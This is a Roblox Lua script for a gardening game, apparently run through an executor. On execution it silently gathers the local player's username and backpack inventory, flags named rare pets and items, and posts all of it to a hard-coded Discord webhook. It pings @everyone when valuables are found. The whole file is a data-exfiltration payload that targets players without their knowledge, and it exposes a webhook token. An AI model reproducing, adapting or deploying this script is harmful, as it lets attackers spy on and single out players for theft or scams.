local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"

local function sendToWebhook(data)
    local jsonData = HttpService:JSONEncode(data)
    pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
end

local function getInventory()
    local inventory = {items = {}, rarePets = {}, rareItems = {}}
    
    local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}
    local rarePets = {
        "Raccoon", "Inverted Raccoon", "Dragonfly", "Disco Bee", "Mimic octopus", "Spinosauros",
        "Brontosaurus", "Queen Bee", "Red Fox", "Ankylosarus", "T-Rex", "Chicken Zombie", "Butterfly"
    }
    local rareItems = {
        "Candy Blossom", "Bone Blossom"
    }

    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local isBanned = false
            for _, word in pairs(bannedWords) do
                if string.find(item.Name:lower(), word:lower()) then
                    isBanned = true
                    break
                end
            end

            if not isBanned then
                table.insert(inventory.items, item.Name)
            end

            for _, rarePet in pairs(rarePets) do
                if string.find(item.Name, rarePet) then
                    table.insert(inventory.rarePets, item.Name)
                    break
                end
            end

            for _, rareItem in pairs(rareItems) do
                if string.find(item.Name, rareItem) then
                    table.insert(inventory.rareItems, item.Name)
                    break
                end
            end
        end
    end

    return inventory
end

local function sendInventoryReport()
    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"

    local fields = {
        {name = "👤 Username", value = LocalPlayer.Name, inline = true},
        {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
    }

    if #inventory.rarePets > 0 then
        table.insert(fields, {name = "🐾 Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```", inline = false})
    end

    if #inventory.rareItems > 0 then
        table.insert(fields, {name = "🌟 Rare Items", value = "```" .. table.concat(inventory.rareItems, "\n") .. "```", inline = false})
    end

    sendToWebhook({
        content = (#inventory.rarePets > 0 or #inventory.rareItems > 0) and "@everyone" or "",
        allowed_mentions = { parse = { "everyone" } },
        username = "Delta Notifier",
        embeds = {{
            title = "🎯 Inventory Report",
            description = "User inventory auto-detected!",
            color = 0x530000,
            fields = fields,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
end

-- ✅ Auto-send inventory report on script execution
sendInventoryReport()
